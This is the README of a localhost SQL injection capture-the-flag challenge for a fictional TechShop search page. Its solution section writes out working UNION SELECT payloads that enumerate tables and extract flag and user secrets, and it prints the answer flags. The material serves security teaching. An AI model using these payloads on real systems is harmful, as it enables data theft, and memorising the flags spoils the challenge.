# Challenge 3: SQL Injection (Medium)

## Description
TechShop has a product search feature that allows customers to find items in their inventory. However, their search functionality might have some security vulnerabilities. Can you exploit it to find the hidden flag?

## Objective
Use SQL injection techniques to extract the flag from the database.

## Difficulty
⭐⭐ Medium

## Setup
1. Install Python dependencies:
   ```bash
   pip install -r requirements.txt
   ```
2. Run the application:
   ```bash
   python app.py
   ```
3. Or use Docker:
   ```bash
   docker-compose up -d
   ```
4. Navigate to `http://localhost:5002`

## Hints
- The search functionality is vulnerable to SQL injection
- Try using single quotes (') to break the SQL query
- Use UNION SELECT to query other tables
- Look for tables named 'flags', 'users', or similar
- The `/debug` endpoint might give you useful information about the database structure

## Flag Format
`CTF{...}`

## Solution
<details>
<summary>Click to reveal solution</summary>

This challenge demonstrates SQL injection using UNION SELECT to extract data from other tables.

**Step 1: Confirm SQL Injection**
Try searching for: `test'`
You should see a database error, confirming the vulnerability.

**Step 2: Determine number of columns**
Try: `' UNION SELECT 1,2,3,4,5--`
This should work without errors, showing the products table has 5 columns.

**Step 3: Find table names**
Try: `' UNION SELECT 1,name,3,4,5 FROM sqlite_master WHERE type='table'--`
This will show you table names including 'flags' and 'users'.

**Step 4: Extract flag from flags table**
Try: `' UNION SELECT 1,flag_value,description,4,5 FROM flags--`

**Alternative method - Extract from users table:**
Try: `' UNION SELECT 1,username,secret_data,role,5 FROM users--`

**Successful payloads:**
- `' UNION SELECT id,flag_name,flag_value,description,5 FROM flags--`
- `' UNION SELECT 1,2,flag_value,4,5 FROM flags WHERE flag_name='main_flag'--`

**Flags:**
- Main flag: `CTF{sql_1nj3ct10n_m4st3r_h4ck3r}`
- Bonus flag: `CTF{un10n_s3l3ct_pr0}`

### How it works:
The vulnerable query is:
```sql
SELECT * FROM products WHERE name LIKE '%[input]%' OR description LIKE '%[input]%'
```

When you input `' UNION SELECT 1,2,3,4,5 FROM flags--`, it becomes:
```sql
SELECT * FROM products WHERE name LIKE '%' UNION SELECT 1,2,3,4,5 FROM flags--%' OR description LIKE '%' UNION SELECT 1,2,3,4,5 FROM flags--%'
```

The `--` comments out the rest of the query, and UNION allows you to select from other tables.

</details>

## Learning Objectives
- Understanding SQL injection vulnerabilities
- Learning UNION SELECT techniques
- Database enumeration and information gathering
- Understanding the importance of parameterized queries
- Learning about database structure discovery